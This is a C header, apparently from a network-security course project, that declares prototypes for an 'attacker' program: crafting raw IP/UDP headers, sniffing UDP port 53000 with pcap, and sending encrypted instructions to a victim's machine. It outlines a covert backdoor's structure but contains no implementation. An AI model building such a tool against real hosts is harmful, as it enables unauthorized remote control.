#ifndef COMP8505_PROJECT_ATTACKER_H
#define COMP8505_PROJECT_ATTACKER_H

#include "common.h"

#define FILTER "udp and src port 53000"

void options_attacker_init(struct options_attacker *opts);
void get_victim_ip(struct options_attacker *opts);
void get_my_ip(char* nic_interface, struct options_attacker *opts);
void create_attacker_udp_socket(struct options_attacker *opts, struct sockaddr_in *victim_address);
void create_attacker_cvc_socket(struct options_attacker *opts, struct sockaddr_in *cvc_address);
unsigned short create_udp_header(struct udphdr* uh);
unsigned short create_ip_header(struct iphdr* ih, char c, struct options_attacker *opts);
void* udp_select_call(void* arg);
void* cvc_checker(void* arg);
void tcp_select_call(struct options_attacker *opts, struct sockaddr_in cvc_address);
void pkt_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
void process_ipv4(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
int get_max_socket_number(struct options_attacker *opts);

void get_victim_MAC(struct options_attacker *opts);
void get_instruction(struct options_attacker *opts);
void get_protocol(struct options_attacker *opts);
bool confirm_user_input(struct options_attacker *opts);
bool is_valid_ipaddress(char *ip_address);
void encrypt_and_create_instruction_file(struct options_attacker *opts);
void send_instruction(struct options_attacker *opts);
int register_victim_socket(struct options_attacker *opts);

#endif //COMP8505_PROJECT_ATTACKER_H
